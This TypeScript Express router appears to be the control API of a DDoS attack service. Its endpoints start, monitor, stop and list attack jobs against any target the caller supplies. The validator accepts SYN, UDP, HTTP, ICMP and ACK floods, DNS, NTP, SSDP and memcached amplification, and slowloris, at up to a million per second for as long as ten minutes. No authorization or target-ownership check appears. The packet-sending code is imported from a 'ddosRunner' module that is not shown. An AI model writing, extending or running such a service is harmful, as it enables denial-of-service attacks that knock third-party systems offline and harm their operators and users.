import { Router, Request, Response } from "express";
import { startAttack, getJob, stopAttack, listJobs, AttackConfig } from "./ddosRunner";

const router = Router();

const ALLOWED_VECTORS = [
  "syn-flood", "udp-flood", "http-flood", "dns-amp",
  "ntp-amp", "ssdp-amp", "slowloris", "icmp-flood",
  "memcached-amp", "ack-flood",
];

function validateConfig(body: any): { valid: boolean; error?: string; config?: AttackConfig } {
  const { vector, target, port, ratePerSecond, duration, threads } = body;

  if (!ALLOWED_VECTORS.includes(vector)) {
    return { valid: false, error: `Invalid vector. Must be one of: ${ALLOWED_VECTORS.join(", ")}` };
  }
  if (!target || typeof target !== "string" || target.trim().length === 0) {
    return { valid: false, error: "target is required" };
  }
  const p = parseInt(port) || 80;
  if (p < 1 || p > 65535) return { valid: false, error: "port must be 1–65535" };

  const rate = Math.min(1000000, Math.max(1, parseInt(ratePerSecond) || 1000));
  const dur = Math.min(600, Math.max(5, parseInt(duration) || 30));
  const thr = Math.min(64, Math.max(1, parseInt(threads) || 4));

  return {
    valid: true,
    config: {
      vector,
      target: target.trim(),
      port: p,
      ratePerSecond: rate,
      duration: dur,
      threads: thr,
      payload: body.payload,
    },
  };
}

router.post("/start", (req: Request, res: Response) => {
  const { valid, error, config } = validateConfig(req.body);
  if (!valid || !config) {
    return res.status(400).json({ error });
  }
  try {
    const job = startAttack(config);
    return res.json({
      jobId: job.id,
      vector: config.vector,
      target: config.target,
      port: config.port,
      duration: config.duration,
      ratePerSecond: config.ratePerSecond,
      threads: config.threads,
      startTime: job.startTime,
      endTime: job.endTime,
    });
  } catch (err: any) {
    return res.status(500).json({ error: err.message || "Failed to start attack" });
  }
});

router.get("/status/:id", (req: Request, res: Response) => {
  const job = getJob(req.params.id);
  if (!job) {
    return res.status(404).json({ error: "Job not found or already completed" });
  }
  const now = Date.now();
  const elapsed = Math.floor((now - job.startTime) / 1000);
  const remaining = Math.max(0, Math.floor((job.endTime - now) / 1000));
  return res.json({
    jobId: job.id,
    active: job.active,
    elapsed,
    remaining,
    progressPct: Math.min(100, Math.floor((elapsed / job.config.duration) * 100)),
    metrics: job.metrics,
    config: {
      vector: job.config.vector,
      target: job.config.target,
      port: job.config.port,
      duration: job.config.duration,
    },
  });
});

router.delete("/stop/:id", (req: Request, res: Response) => {
  const stopped = stopAttack(req.params.id);
  if (!stopped) {
    return res.status(404).json({ error: "Job not found" });
  }
  return res.json({ success: true, message: "Attack stopped" });
});

router.get("/jobs", (_req: Request, res: Response) => {
  const jobs = listJobs().map((j) => ({
    jobId: j.id,
    vector: j.config.vector,
    target: j.config.target,
    active: j.active,
    elapsed: Math.floor((Date.now() - j.startTime) / 1000),
    metrics: j.metrics,
  }));
  return res.json({ jobs });
});

export default router;
